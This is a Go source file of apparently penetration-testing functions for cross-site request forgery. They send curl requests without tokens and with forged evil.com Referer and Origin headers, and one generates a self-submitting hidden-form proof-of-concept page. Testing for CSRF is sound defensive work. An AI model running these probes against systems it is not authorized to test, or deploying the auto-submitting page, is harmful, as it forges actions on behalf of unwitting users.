package websecurity

import (
	"fmt"
	"strings"
)

func CSRFNoToken(target, action string) (string, error) {
	cmd := throttledExec("curl", "-s", "-X", "POST", "-d", action, "-H", "Content-Type: application/x-www-form-urlencoded", target)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("CSRF no-token test failed: %w: %s", err, string(out))
	}
	return fmt.Sprintf("CSRF no-token test on %s with action %s: response_len=%d", target, action, len(out)), nil
}

func CSRFWeakToken(target string) (string, error) {
	cmd := throttledExec("curl", "-s", "-v", target)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("CSRF weak token detection failed: %w: %s", err, string(out))
	}
	output := string(out)
	hasToken := strings.Contains(output, "csrf") || strings.Contains(output, "token") || strings.Contains(output, "authenticity")
	return fmt.Sprintf("CSRF weak token analysis on %s: token_found=%v response_len=%d", target, hasToken, len(out)), nil
}

func CSRFRefererBypass(target string) (string, error) {
	cmd := throttledExec("curl", "-s", "-X", "POST", "-d", "test=1", "-H", "Referer: https://evil.com", target)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("CSRF referer bypass test failed: %w: %s", err, string(out))
	}
	accepted := !strings.Contains(string(out), "403") && !strings.Contains(string(out), "forbidden")
	return fmt.Sprintf("CSRF referer bypass test on %s: accepted=%v response_len=%d", target, accepted, len(out)), nil
}

func CSRFSameSiteBypass(target string) (string, error) {
	cmd := throttledExec("curl", "-s", "-X", "POST", "-d", "test=1", "-b", "session=attacker", "-H", "Origin: https://evil.com", target)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("CSRF SameSite bypass test failed: %w: %s", err, string(out))
	}
	return fmt.Sprintf("CSRF SameSite bypass test on %s: response_len=%d", target, len(out)), nil
}

func CSRFGeneratePoC(method, action, params string) (string, error) {
	var html string
	if method == "GET" {
		html = fmt.Sprintf(`<html><body><a href="%s?%s">Click me</a></body></html>`, action, params)
	} else {
		html = fmt.Sprintf(`<html><body><form action="%s" method="POST"><input type="hidden" name="data" value="%s"><input type="submit"></form><script>document.forms[0].submit();</script></body></html>`, action, params)
	}
	return fmt.Sprintf("CSRF PoC generated for %s %s:\n%s", method, action, html), nil
}
